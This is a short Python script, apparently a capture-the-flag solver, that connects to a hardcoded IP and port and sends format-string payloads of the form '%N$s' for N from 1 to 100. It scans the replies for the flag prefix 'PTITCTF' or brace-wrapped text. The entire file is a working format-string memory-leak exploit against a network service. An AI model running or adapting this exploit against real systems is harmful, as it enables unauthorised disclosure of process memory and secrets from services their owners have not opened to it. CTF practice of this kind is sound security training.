#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def test(n):
    try:
        s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
        s.send(("%%%d$s"%n).encode()+b"\n")
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception: return b'ERR'
hits=[]
for n in range(1,101):
    d=test(n)
    if b'PTITCTF' in d or b'2026' in d or (b'{' in d and b'}' in d):
        hits.append((n,d))
    time.sleep(0.03)
print("hits:", [(n,repr(d[:150])) for n,d in hits])
